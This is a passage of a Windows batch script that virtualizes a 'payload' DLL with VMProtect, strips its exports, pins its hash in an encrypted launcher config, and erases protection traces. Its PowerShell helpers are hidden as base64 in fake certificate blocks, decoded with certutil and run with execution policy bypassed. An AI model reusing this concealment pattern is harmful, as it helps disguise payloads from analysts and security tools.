echo   %C_GREEN%OK%C_RESET% Protected Output Validated.
call :verify_segment "%WORK_DIR%\out.dll"
if errorlevel 1 goto :segment_error
echo   %C_GREEN%[+]%C_RESET% VM Segment = %C_GREEN%%VM_SEG%%C_RESET% (Verified)
call :strip_exports "%WORK_DIR%\out.dll"
if errorlevel 1 goto :strip_error
echo.
echo.

echo [%C_GREEN%5%C_RESET%/%C_GREEN%6%C_RESET%] Re-pinning Payload Hash...
echo.
copy /y "%WORK_DIR%\out.dll" "%TARGET%" > nul
if errorlevel 1 goto :deploy_error
call :sha256_of "%TARGET%" OUT_SHA
if errorlevel 1 goto :hash_error
if not defined OUT_SHA goto :hash_error
set "PIN_SRC=%WORK_DIR%\pin.ini"
set "PINGEN_TMP=%TEMP%\amg_pingen_%RANDOM%%RANDOM%"
set "PINGEN_B64=%PINGEN_TMP%.b64"
set "PINGEN_PS1=%PINGEN_TMP%.ps1"
set "PINGEN_RC=1"
>"%PINGEN_B64%" echo -----BEGIN CERTIFICATE-----
>>"%PINGEN_B64%" echo cGFyYW0oW3N0cmluZ10kQ29uZmlnTWFzdGVyLCBbc3RyaW5nXSRPdXRTaGEsIFtzdHJpbmddJFBpblNyYykNCiRjID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgkQ29uZmlnTWFzdGVyKQ0KJGMgPSBbcmVnZXhdOjpSZXBsYWNlKCRjLCAnKD9tKV5QYXlsb2FkU2hhMjU2XHMqPS4qJCcsICdQYXlsb2FkU2hhMjU2ID0gJyArICgkT3V0U2hhKSkNCltJTy5GaWxlXTo6V3JpdGVBbGxUZXh0KCRQaW5TcmMsICRjLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKQ0K
>>"%PINGEN_B64%" echo -----END CERTIFICATE-----
certutil -decode "%PINGEN_B64%" "%PINGEN_PS1%" >nul 2>&1
if errorlevel 1 goto :pingen_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%PINGEN_PS1%" -ConfigMaster "%CONFIG_MASTER%" -OutSha "%OUT_SHA%" -PinSrc "%PIN_SRC%"
set "PINGEN_RC=%ERRORLEVEL%"
:pingen_cleanup
if exist "%PINGEN_PS1%" del /f /q "%PINGEN_PS1%" >nul 2>&1
if exist "%PINGEN_B64%" del /f /q "%PINGEN_B64%" >nul 2>&1
if not "%PINGEN_RC%"=="0" goto :pin_error
if not exist "%PIN_SRC%" goto :pin_error
echo   %C_GREEN%[+]%C_RESET% PayloadSha256 = %C_GREEN%%OUT_SHA%%C_RESET%
if not exist "%CONFIG_SCRIPT%" goto :pin_error
if /i "%AMEGER_ENCRYPT_CONFIG%"=="0" (
  echo   %C_RED%Error: AMEGER_ENCRYPT_CONFIG=0 Is Refused; The Launcher Rejects Plaintext Configs.%C_RESET%
  goto :pin_error
)
if not exist "%DEPLOYED_CONFIG%" goto :pin_error
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%CONFIG_SCRIPT%" -Source "%PIN_SRC%" -Destination "%DEPLOYED_CONFIG%"
if errorlevel 1 goto :pin_error
echo   %C_GREEN%[+]%C_RESET% Config re-encrypted = %C_GREEN%%DEPLOYED_CONFIG%%C_RESET%
goto :pin_done

:pin_done
call :assert_master_pin
if errorlevel 1 goto :pin_error
call :write_state
echo.
echo.

echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Sweeping Protection Artifacts...
echo.
call :clean_work
if errorlevel 1 goto :cleanup_error
call :assert_clean
if errorlevel 1 goto :cleanup_error
echo   %C_GREEN%[+]%C_RESET% No VMProtect traces in %C_GREEN%%DLL_DIR%%C_RESET%.
echo.
echo Payload Protection Completed.
echo   Payload    = %C_GREEN%%TARGET%%C_RESET%
echo.
echo.
if "%NO_PAUSE%"=="0" pause
exit /b 0

:already_protected
echo.
echo Payload Is Already VMProtect-Protected; Release Unchanged.
echo.
if "%NO_PAUSE%"=="0" pause
exit /b 0

:check_already_protected
set "VMP_PRESENT="
set "VMP_PROBE_OK="
set "BASELINE="
if exist "%RELEASE_CACHE%\pe-sections.txt" for /f "usebackq tokens=1,* delims=:" %%A in ("%RELEASE_CACHE%\pe-sections.txt") do if /i "%%A"=="%TARGET_NAME%" set "BASELINE=%%B"
if not defined BASELINE (
  echo   %C_RED%Warning: No Section Baseline Recorded For %TARGET_NAME%.%C_RESET%
  echo   %C_RED%         Refusing To Guess Whether The Payload Is Already Protected.%C_RESET%
  goto :vmp_check_cleanup
)
REM The VMProtect probe is a PowerShell script carried as base64 so that batch never has to parse a
REM stray parenthesis from the PowerShell grammar. certutil decodes it to a unique temp .ps1, which is
REM run and then removed. The probe reads the target's PE section table and reports any section absent
REM from the recorded baseline as a VMP_PRESENT line. VMP_PROBE_OK is set only when the probe ran and
REM produced a readable result; callers must treat an unset VMP_PROBE_OK as "unknown", never as
REM "not protected", or a broken probe would silently re-virtualize an already-protected binary.
set "VMP_CHK=%TEMP%\amg_vmpchk_%RANDOM%%RANDOM%"
set "VMP_CHK_B64=%VMP_CHK%.b64"
set "VMP_CHK_PS1=%VMP_CHK%.ps1"
set "VMP_CHK_OUT=%VMP_CHK%.out"
>"%VMP_CHK_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VMP_CHK_B64%" echo cGFyYW0oDQogICAgW3N0cmluZ10kQmFzZWxpbmUgPSAnQG5vbmVAJywNCiAgICBbc3RyaW5nXSRUYXJnZXQNCikNCiRiYXNlPSgkQmFzZWxpbmUpLlNwbGl0KCcsJykNCiRiPVtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRUYXJnZXQpDQokZT1bQml0Q29udmVydGVyXTo6VG9JbnQzMigkYiwweDNDKQ0KJGM9JGUrNA0KJG49W0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRiLCRjKzIpDQokej1bQml0Q29udmVydGVyXTo6VG9VSW50MTYoJGIsJGMrMTYpDQokcz0kYysyMCskeg0KZm9yKCRpPTA7JGkgLWx0ICRuOyRpKyspew0KICAgICRvPSRzKzQwKiRpDQogICAgJG5tPVtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKCRiLCRvLDgpLlRyaW0oW2NoYXJdMCkNCiAgICAkeD1bQml0Q29udmVydGVyXTo6VG9VSW50MzIoJGIsJG8rMzYpDQogICAgaWYoJHggLWJhbmQgMHgyMDAwMDAwMCl7ICR0YWc9JG5tKycrWCcgfSBlbHNlIHsgJHRhZz0kbm0gfQ0KICAgIGlmKCRiYXNlIC1ub3Rjb250YWlucyAkdGFnKXsgV3JpdGUtT3V0cHV0ICgnVk1QX1BSRVNFTlQ9JyArICRubSkgfQ0KfQ0K
>>"%VMP_CHK_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VMP_CHK_B64%" "%VMP_CHK_PS1%" >nul 2>&1
if errorlevel 1 goto :vmp_check_cleanup
if not exist "%VMP_CHK_PS1%" goto :vmp_check_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VMP_CHK_PS1%" -Baseline "%BASELINE%" -Target "%TARGET%" >"%VMP_CHK_OUT%" 2>&1
if errorlevel 1 goto :vmp_check_cleanup
if not exist "%VMP_CHK_OUT%" goto :vmp_check_cleanup
set "VMP_PROBE_OK=1"
for /f "usebackq tokens=1,* delims==" %%A in ("%VMP_CHK_OUT%") do if /i "%%A"=="VMP_PRESENT" set "VMP_PRESENT=%%B"
:vmp_check_cleanup
if exist "%VMP_CHK_PS1%" del /f /q "%VMP_CHK_PS1%" >nul 2>&1
if exist "%VMP_CHK_B64%" del /f /q "%VMP_CHK_B64%" >nul 2>&1
if exist "%VMP_CHK_OUT%" del /f /q "%VMP_CHK_OUT%" >nul 2>&1
exit /b 0

:already_done
echo.
echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Sweeping Protection Artifacts...
echo.
call :clean_work
if errorlevel 1 goto :cleanup_error
call :assert_clean
if errorlevel 1 goto :cleanup_error
echo   %C_GREEN%[+]%C_RESET% No VMProtect traces in %C_GREEN%%DLL_DIR%%C_RESET%.
echo.
echo Payload Already Protected; Release Unchanged.
echo.
if defined VMSEG echo VM Segment = %C_GREEN%%VMSEG%%C_RESET% (Recorded)
echo Payload = %C_GREEN%%TARGET%%C_RESET%
if "%NO_PAUSE%"=="0" pause
exit /b 0

:consider_dll
set "CANDIDATE=%~1"
if not defined CANDIDATE exit /b 0
if /i "%~nx1"=="%RUNTIME_NAME%" exit /b 0
set /a "DLL_CANDIDATES+=1"
if defined TARGET exit /b 0
set "TARGET=%CANDIDATE%"
exit /b 0

:prepare_project
set "PROJ_WORK=%WORK_DIR%\project.vmp"
set "SEG_NAME="
set "VMP_DROP="
set "VMP_KEEP="
for /f "usebackq tokens=1,* delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%BUILD_VMP_SCRIPT%" -Project "%VMP_PROJECT%" -Out "%PROJ_WORK%" -Target "%TARGET%" %~1`) do set "%%A=%%B"
if not exist "%PROJ_WORK%" exit /b 1
if not defined SEG_NAME exit /b 1
if defined VMP_DROP (
  echo   %C_YELLOW%[!]%C_RESET% .vmp Procedure^(s^) Absent From Payload, Dropped: %C_YELLOW%%VMP_DROP%%C_RESET%
  echo   %C_YELLOW%      Virtualizing Only What The Payload Exposes: %VMP_KEEP%%C_RESET%
)
exit /b 0

:run_vmp
"%VMP_CON%" "%TARGET%" "%WORK_DIR%\out.dll" -pf "%PROJ_WORK%" -we > "%WORK_DIR%\vmp.log" 2>&1
exit /b %ERRORLEVEL%

:strip_exports
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%STRIP_SCRIPT%" -Path "%~1"
exit /b %ERRORLEVEL%

:find_vmp_con
if defined AMEGER_VMP_CON if exist "%AMEGER_VMP_CON%" (
  set "VMP_CON=%AMEGER_VMP_CON%"
  goto :vmp_con_bat_check
)
call :scan_vmp_dirs "%ProgramFiles%"
call :scan_vmp_dirs "%ProgramW6432%"
call :scan_vmp_dirs "%ProgramFiles(x86)%"
call :scan_vmp_dirs "%LOCALAPPDATA%"
call :scan_vmp_dirs "%ALLUSERSPROFILE%"
if not defined VMP_CON for /f "delims=" %%E in ('where VMProtect_Con.exe 2^>nul') do if not defined VMP_CON set "VMP_CON=%%E"
if not defined VMP_CON for /f "delims=" %%E in ('where vmpconsole.exe 2^>nul') do if not defined VMP_CON set "VMP_CON=%%E"
if not defined VMP_CON exit /b 1
:vmp_con_bat_check
set "VMP_CON=%VMP_CON:"=%"
if not exist "%VMP_CON%" exit /b 1
for %%X in ("%VMP_CON%") do if /i "%%~xX"==".bat" exit /b 2
for %%X in ("%VMP_CON%") do if /i "%%~xX"==".cmd" exit /b 2
exit /b 0

:scan_vmp_dirs
for /d %%D in ("%~1\VMProtect*") do if not defined VMP_CON for %%E in ("%%~fD\VMProtect_Con.exe" "%%~fD\VMProtect_Console.exe" "%%~fD\vmpconsole.exe") do if not defined VMP_CON if exist "%%E" set "VMP_CON=%%E"
exit /b 0

:find_project
if defined AMEGER_VMP_PROJECT_DLL if exist "%AMEGER_VMP_PROJECT_DLL%" (
  set "VMP_PROJECT=%AMEGER_VMP_PROJECT_DLL%"
  exit /b 0
)
if exist "%ASSET_TPL%\%PAYLOAD_ORIGINAL_NAME%.vmp" (
  set "VMP_PROJECT=%ASSET_TPL%\%PAYLOAD_ORIGINAL_NAME%.vmp"
  exit /b 0
)
if exist "%~dp0%PAYLOAD_ORIGINAL_NAME%.vmp" (
  set "VMP_PROJECT=%~dp0%PAYLOAD_ORIGINAL_NAME%.vmp"
  exit /b 0
)
for %%F in ("%ASSET_TPL%\*.vmp") do if not defined VMP_PROJECT set "VMP_PROJECT=%%~fF"
if defined VMP_PROJECT if exist "%VMP_PROJECT%" exit /b 0
for %%F in ("%~dp0*.vmp") do if not defined VMP_PROJECT set "VMP_PROJECT=%%~fF"
if defined VMP_PROJECT if exist "%VMP_PROJECT%" exit /b 0
set "VMP_PROJECT="
exit /b 1

:check_project_input
set "PROJIN_TMP=%TEMP%\amg_projin_%RANDOM%%RANDOM%"
set "PROJIN_B64=%PROJIN_TMP%.b64"
set "PROJIN_PS1=%PROJIN_TMP%.ps1"
set "PROJIN_RC=1"
>"%PROJIN_B64%" echo -----BEGIN CERTIFICATE-----
>>"%PROJIN_B64%" echo cGFyYW0oW3N0cmluZ10kVm1wUHJvamVjdCwgW3N0cmluZ10kRXhwZWN0ZWROYW1lKQ0KJHggPSBbeG1sXVtJTy5GaWxlXTo6UmVhZEFsbFRleHQoJFZtcFByb2plY3QpDQokaSA9IFtzdHJpbmddJHguRG9jdW1lbnQuUHJvdGVjdGlvbi5JbnB1dEZpbGVOYW1lDQppZiAoJGkgLWVxICRFeHBlY3RlZE5hbWUpIHsgZXhpdCAwIH0NCldyaXRlLUhvc3QgKCcgICAgcHJvamVjdCB0YXJnZXRzOiAnICsgJGkpDQpleGl0IDENCg==
>>"%PROJIN_B64%" echo -----END CERTIFICATE-----
certutil -decode "%PROJIN_B64%" "%PROJIN_PS1%" >nul 2>&1
if errorlevel 1 goto :projin_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%PROJIN_PS1%" -VmpProject "%VMP_PROJECT%" -ExpectedName "%PAYLOAD_ORIGINAL_NAME%"
set "PROJIN_RC=%ERRORLEVEL%"
:projin_cleanup
if exist "%PROJIN_PS1%" del /f /q "%PROJIN_PS1%" >nul 2>&1
if exist "%PROJIN_B64%" del /f /q "%PROJIN_B64%" >nul 2>&1
exit /b %PROJIN_RC%

:vmp_settings
set "VMPSET_TMP=%TEMP%\amg_vmpset_%RANDOM%%RANDOM%"
set "VMPSET_B64=%VMPSET_TMP%.b64"
set "VMPSET_PS1=%VMPSET_TMP%.ps1"
>"%VMPSET_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VMPSET_B64%" echo cGFyYW0oW3N0cmluZ10kVm1wUHJvamVjdCkNCiR4ID0gW3htbF1bSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRWbXBQcm9qZWN0KQ0KJHAgPSAkeC5Eb2N1bWVudC5Qcm90ZWN0aW9uDQpXcml0ZS1Ib3N0ICgnICAgIElucHV0ICAgICAgICAgOiAnICsgJHAuSW5wdXRGaWxlTmFtZSkNCldyaXRlLUhvc3QgKCcgICAgVk0gY29tcGxleGl0eSA6ICcgKyAkcC5WTUNvbXBsZXhpdHkpDQpXcml0ZS1Ib3N0ICgnICAgIFZNIGluc3RhbmNlcyAgOiAnICsgJHAuVk1JbnN0YW5jZXMpDQpXcml0ZS1Ib3N0ICgnICAgIE9wdGlvbnMgICAgICAgOiAnICsgJHAuT3B0aW9ucykNCldyaXRlLUhvc3QgJyAgICBQcm9jZWR1cmVzICAgIDonDQpmb3JlYWNoICgkcSBpbiAkcC5Qcm9jZWR1cmVzLlByb2NlZHVyZSkgew0KICAgIFdyaXRlLUhvc3QgKCcgICAgICAtICcgKyAkcS5NYXBBZGRyZXNzICsgJyAgQ29tcGlsYXRpb25UeXBlPScgKyAkcS5Db21waWxhdGlvblR5cGUgKyAnICBDb21wbGV4aXR5PScgKyAkcS5Db21wbGV4aXR5KQ0KfQ0K
>>"%VMPSET_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VMPSET_B64%" "%VMPSET_PS1%" >nul 2>&1
if errorlevel 1 goto :vmpset_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VMPSET_PS1%" -VmpProject "%VMP_PROJECT%"
:vmpset_cleanup
if exist "%VMPSET_PS1%" del /f /q "%VMPSET_PS1%" >nul 2>&1
if exist "%VMPSET_B64%" del /f /q "%VMPSET_B64%" >nul 2>&1
exit /b 0

:read_state
set "STATE_MATCH=unknown"
if not exist "%STATE_FILE%" exit /b 0
set "SRC="
set "OUT="
for /f "usebackq tokens=1,* delims==" %%A in ("%STATE_FILE%") do set "%%A=%%B"
if not defined OUT exit /b 0
call :sha256_of "%TARGET%" CUR
if errorlevel 1 exit /b 0
if /i "%CUR%"=="%OUT%" (
  set "STATE_MATCH=output"
  exit /b 0
)
if defined SRC if /i "%CUR%"=="%SRC%" (
  set "STATE_MATCH=source"
  exit /b 0
)
exit /b 0

:sha256_of
set "SHA256="
if not exist "%~1" exit /b 1
set "SHATMP_TMP=%TEMP%\amg_sha_%RANDOM%%RANDOM%"
set "SHATMP_B64=%SHATMP_TMP%.b64"
set "SHATMP_PS1=%SHATMP_TMP%.ps1"
set "SHATMP_OUT=%SHATMP_TMP%.out"
>"%SHATMP_B64%" echo -----BEGIN CERTIFICATE-----
>>"%SHATMP_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKSkpIC1yZXBsYWNlICctJywnJykNCldyaXRlLU91dHB1dCAoJ1NIQTI1Nj0nICsgJGgpDQo=
>>"%SHATMP_B64%" echo -----END CERTIFICATE-----
certutil -decode "%SHATMP_B64%" "%SHATMP_PS1%" >nul 2>&1
if errorlevel 1 goto :sha_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%SHATMP_PS1%" -Path "%~1" >"%SHATMP_OUT%" 2>&1
for /f "usebackq tokens=1,2 delims==" %%A in ("%SHATMP_OUT%") do set "%%A=%%B"
:sha_cleanup
if exist "%SHATMP_PS1%" del /f /q "%SHATMP_PS1%" >nul 2>&1
if exist "%SHATMP_B64%" del /f /q "%SHATMP_B64%" >nul 2>&1
if exist "%SHATMP_OUT%" del /f /q "%SHATMP_OUT%" >nul 2>&1
if not defined SHA256 exit /b 1
set "%~2=%SHA256%"
set "SHA256="
exit /b 0

:validate_output
if not exist "%WORK_DIR%\out.dll" exit /b 1
set "VALOUT_TMP=%TEMP%\amg_valout_%RANDOM%%RANDOM%"
set "VALOUT_B64=%VALOUT_TMP%.b64"
set "VALOUT_PS1=%VALOUT_TMP%.ps1"
set "VALOUT_RC=1"
>"%VALOUT_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VALOUT_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRiID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpDQppZiAoJGIuTGVuZ3RoIC1sdCAyKSB7IGV4aXQgMSB9DQppZiAoJGJbMF0gLW5lIDB4NEQgLW9yICRiWzFdIC1uZSAweDVBKSB7IGV4aXQgMSB9DQpleGl0IDANCg==
>>"%VALOUT_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VALOUT_B64%" "%VALOUT_PS1%" >nul 2>&1
if errorlevel 1 goto :valout_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VALOUT_PS1%" -Path "%WORK_DIR%\out.dll"
set "VALOUT_RC=%ERRORLEVEL%"
:valout_cleanup
if exist "%VALOUT_PS1%" del /f /q "%VALOUT_PS1%" >nul 2>&1
if exist "%VALOUT_B64%" del /f /q "%VALOUT_B64%" >nul 2>&1
if not "%VALOUT_RC%"=="0" exit /b 1
fc /b "%WORK_DIR%\out.dll" "%TARGET%" > nul
if errorlevel 2 exit /b 2
if not errorlevel 1 exit /b 1
exit /b 0

:verify_segment
set "VM_SEG="
set "VM_SEG_STATUS="
set "VMSEG_TMP=%TEMP%\amg_vmseg_%RANDOM%%RANDOM%"
set "VMSEG_B64=%VMSEG_TMP%.b64"
set "VMSEG_PS1=%VMSEG_TMP%.ps1"
set "VMSEG_OUT=%VMSEG_TMP%.out"
>"%VMSEG_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VMSEG_B64%" echo cGFyYW0oW3N0cmluZ10kU2VnbWVudCwgW3N0cmluZ10kUGF0aCkNCiRiID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpDQokZSA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRiLCAweDNDKQ0KJGMgPSAkZSArIDQNCiRuID0gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRiLCAkYyArIDIpDQokeiA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkYiwgJGMgKyAxNikNCiRzID0gJGMgKyAyMCArICR6DQokZm91bmQgPSAkbnVsbA0KZm9yICgkaSA9IDA7ICRpIC1sdCAkbjsgJGkrKykgew0KICAgICRvID0gJHMgKyA0MCAqICRpDQogICAgJG5tID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJGIsICRvLCA4KS5UcmltKFtjaGFyXTApDQogICAgaWYgKCRubS5TdGFydHNXaXRoKCRTZWdtZW50KSkgeyAkZm91bmQgPSAkbm07IGJyZWFrIH0NCn0NCmlmICgkbnVsbCAtZXEgJGZvdW5kKSB7DQogICAgV3JpdGUtT3V0cHV0ICdWTV9TRUdfU1RBVFVTPW1pc3NpbmcnDQogICAgV3JpdGUtT3V0cHV0ICdWTV9TRUc9Jw0KICAgIGV4aXQgMA0KfQ0KV3JpdGUtT3V0cHV0ICgnVk1fU0VHPScgKyAkZm91bmQpDQppZiAoJGZvdW5kIC1tYXRjaCAoJ14nICsgW3JlZ2V4XTo6RXNjYXBlKCRTZWdtZW50KSArICdbMC05XSokJykpIHsNCiAgICBXcml0ZS1PdXRwdXQgJ1ZNX1NFR19TVEFUVVM9b2snDQp9IGVsc2Ugew0KICAgIFdyaXRlLU91dHB1dCAnVk1fU0VHX1NUQVRVUz1taXNtYXRjaCcNCn0NCmV4aXQgMA0K
>>"%VMSEG_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VMSEG_B64%" "%VMSEG_PS1%" >nul 2>&1
if errorlevel 1 goto :vmseg_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VMSEG_PS1%" -Segment "%SEG_NAME%" -Path "%~1" >"%VMSEG_OUT%" 2>&1
for /f "usebackq tokens=1,* delims==" %%A in ("%VMSEG_OUT%") do set "%%A=%%B"
:vmseg_cleanup
if exist "%VMSEG_PS1%" del /f /q "%VMSEG_PS1%" >nul 2>&1
if exist "%VMSEG_B64%" del /f /q "%VMSEG_B64%" >nul 2>&1
if exist "%VMSEG_OUT%" del /f /q "%VMSEG_OUT%" >nul 2>&1
if /i "%VM_SEG_STATUS%"=="ok" exit /b 0
if /i "%VM_SEG_STATUS%"=="missing" (
  echo   %C_RED%Error: No VMProtect Segment Found In The Protected Output.%C_RESET%
) else (
  echo   %C_RED%Error: VMProtect Segment Name Mismatch In The Protected Output.%C_RESET%
)
echo   %C_RED%       Expected = %SEG_NAME% (Optionally Followed By Digits)%C_RESET%
echo   %C_RED%       Observed = %VM_SEG%%C_RESET%
exit /b 1

:assert_master_pin
if not exist "%PAYLOAD_ASSET%" exit /b 1
call :sha256_of "%PAYLOAD_ASSET%" ASSET_SHA
if errorlevel 1 exit /b 1
if not defined ASSET_SHA exit /b 1
set "PINCHK_TMP=%TEMP%\amg_pinchk_%RANDOM%%RANDOM%"
set "PINCHK_B64=%PINCHK_TMP%.b64"
set "PINCHK_PS1=%PINCHK_TMP%.ps1"
set "PINCHK_RC=1"
>"%PINCHK_B64%" echo -----BEGIN CERTIFICATE-----
>>"%PINCHK_B64%" echo cGFyYW0oW3N0cmluZ10kQ29uZmlnTWFzdGVyLCBbc3RyaW5nXSRBc3NldFNoYSkNCiRjID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgkQ29uZmlnTWFzdGVyKQ0KJG0gPSBbcmVnZXhdOjpNYXRjaCgkYywgJyg/bSleUGF5bG9hZFNoYTI1NlxzKj1ccyooWzAtOUEtRmEtZl17NjR9KScpDQppZiAoLW5vdCAkbS5TdWNjZXNzKSB7IGV4aXQgMSB9DQppZiAoJG0uR3JvdXBzWzFdLlZhbHVlIC1uZSAkQXNzZXRTaGEpIHsNCiAgICBXcml0ZS1Ib3N0ICgnICAgIG1hc3RlciBwaW5zIDogJyArICRtLkdyb3Vwc1sxXS5WYWx1ZSkNCiAgICBXcml0ZS1Ib3N0ICgnICAgIGFzc2V0IGlzICAgIDogJyArICRBc3NldFNoYSkNCiAgICBleGl0IDENCn0NCmV4aXQgMA0K
>>"%PINCHK_B64%" echo -----END CERTIFICATE-----
certutil -decode "%PINCHK_B64%" "%PINCHK_PS1%" >nul 2>&1
if errorlevel 1 goto :pinchk_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%PINCHK_PS1%" -ConfigMaster "%CONFIG_MASTER%" -AssetSha "%ASSET_SHA%"
set "PINCHK_RC=%ERRORLEVEL%"
:pinchk_cleanup
if exist "%PINCHK_PS1%" del /f /q "%PINCHK_PS1%" >nul 2>&1
if exist "%PINCHK_B64%" del /f /q "%PINCHK_B64%" >nul 2>&1
exit /b %PINCHK_RC%

:write_state
if not exist "%RELEASE_CACHE%" mkdir "%RELEASE_CACHE%"
if not exist "%RELEASE_CACHE%" exit /b 1
>"%STATE_FILE%" echo SRC=%SRC_SHA%
>>"%STATE_FILE%" echo OUT=%OUT_SHA%
>>"%STATE_FILE%" echo VMSEG=%VM_SEG%
exit /b 0

:read_names_state
set "PAYLOAD_NAME="
set "RUNTIME_NAME="
if not exist "%NAMES_STATE%" exit /b 1
for /f "usebackq tokens=1,* delims==" %%A in ("%NAMES_STATE%") do set "%%A=%%B"
if not defined PAYLOAD_NAME exit /b 1
if not defined RUNTIME_NAME exit /b 1
exit /b 0

:tail_log
if exist "%WORK_DIR%\vmp.log" for /f "usebackq delims=" %%L in ("%WORK_DIR%\vmp.log") do echo     %%L
exit /b 0

:clean_work
if exist "%WORK_DIR%" rmdir /s /q "%WORK_DIR%"
if exist "%WORK_DIR%" exit /b 1
exit /b 0

:assert_clean
set "LOG_NAME="
if exist "%NAMES_STATE%" for /f "usebackq tokens=1,* delims==" %%A in ("%NAMES_STATE%") do if /i "%%A"=="LOG_NAME" set "LOG_NAME=%%B"
if not defined LOG_NAME for %%I in ("%OUT_ROOT%\*.ini") do if not defined LOG_NAME set "LOG_NAME=%%~nI.log"
for %%F in ("%DLL_DIR%\*.vmp" "%DLL_DIR%\*.log" "%DLL_DIR%\*.bak" "%DLL_DIR%\*.tmp") do if /i not "%%~nxF"=="Result.log" if /i not "%%~nxF"=="%LOG_NAME%" if exist "%%~F" (
  echo   %C_RED%Error: Protection Artifact Left In The Release Folder: %%~nxF%C_RESET%
  exit /b 1
)
exit /b 0

:vmp_wrapper
echo   %C_RED%Error: AMEGER_VMP_CON Points At A Batch/CMD Wrapper: %VMP_CON%%C_RESET%
echo   %C_RED%       A Wrapper Transfers Control And Never Returns; Use The Real Console.%C_RESET%
goto :failure

:vmp_missing
echo   %C_RED%Error: VMProtect Console Not Found.%C_RESET%
echo   %C_YELLOW%       Searched:%C_RESET%
echo         %PROGRAMFILES%\VMProtect*\VMProtect_Con.exe
echo         %PROGRAMW6432%\VMProtect*\VMProtect_Con.exe
echo         %PROGRAMFILES(X86)%\VMProtect*\VMProtect_Con.exe
echo         %LOCALAPPDATA%\VMProtect*\VMProtect_Con.exe
echo         PATH ^(VMProtect_Con.exe, vmpconsole.exe^)
echo   %C_YELLOW%       Fix: Set AMEGER_VMP_CON to the full path, with no surrounding quotes,%C_RESET%
echo   %C_YELLOW%             e.g. set AMEGER_VMP_CON=C:\Program Files\VMProtect Ultimate\VMProtect_Con.exe%C_RESET%
echo   %C_YELLOW%       Leaving It Unset Is Fine If VMProtect Is Installed Normally.%C_RESET%
echo   %C_YELLOW%       Note: The Console Build Is Not Included In The Lite Edition.%C_RESET%
goto :failure

:names_missing
echo   %C_RED%Error: Per-Build Name State Not Found Or Incomplete: %NAMES_STATE%%C_RESET%
echo   %C_RED%       Run Create.bat First; The Deployed Payload And Runtime DLL Cannot Be Resolved.%C_RESET%
goto :failure

:target_missing
echo   %C_RED%Error: No Virtualizable Payload DLL Found In The Release Folder.%C_RESET%
goto :failure

:target_ambiguous
echo   %C_RED%Error: Expected Exactly One Virtualizable Payload DLL In %DLL_DIR%, found %DLL_CANDIDATES%.%C_RESET%
echo   %C_RED%       Refusing To Guess Which DLL To Protect.%C_RESET%
goto :failure

:project_missing
echo   %C_RED%Error: No .vmp Project Found; Set AMEGER_VMP_PROJECT_DLL.%C_RESET%
goto :failure

:project_mismatch
echo   %C_RED%Error: The Project Does Not Target This Binary.%C_RESET%
echo   %C_RED%       Refusing To Protect With A Crossed Project.%C_RESET%
goto :failure

:work_error
echo   %C_RED%Error: Unable To Prepare The Protection Staging Directory.%C_RESET%
goto :failure

:hash_error
echo   %C_RED%Error: Unable To Calculate The Payload SHA-256.%C_RESET%
goto :failure

:output_invalid
echo   %C_RED%Error: VMProtect Output Failed Validation; Release Left Untouched.%C_RESET%
goto :failure

:segment_error
echo   %C_RED%Error: The Protected Payload Does Not Carry The Generated VMProtect Segment.%C_RESET%
echo   %C_RED%       Release Left Untouched; The Output Was Not Deployed.%C_RESET%
goto :failure

:fc_error
echo   %C_RED%Error: Unable To Compare The Protected Output Against The Source.%C_RESET%
echo   %C_RED%       fc Failed; The Output Is Unverified And Will Not Ship.%C_RESET%
goto :failure

:project_error
echo   %C_RED%Error: Unable To Prepare The Randomized Project Copy.%C_RESET%
goto :failure

:strip_error
echo   %C_RED%Error: Unable To Strip The Payload Export Directory.%C_RESET%
echo   %C_RED%       The release payload would ship its only named symbol.%C_RESET%
goto :failure

:deploy_error
echo   %C_RED%Error: Unable To Deploy The Protected Payload.%C_RESET%
goto :failure

:pin_error
echo   %C_RED%Error: Unable To Re-Pin The Release Config Or Re-Encrypt It.%C_RESET%
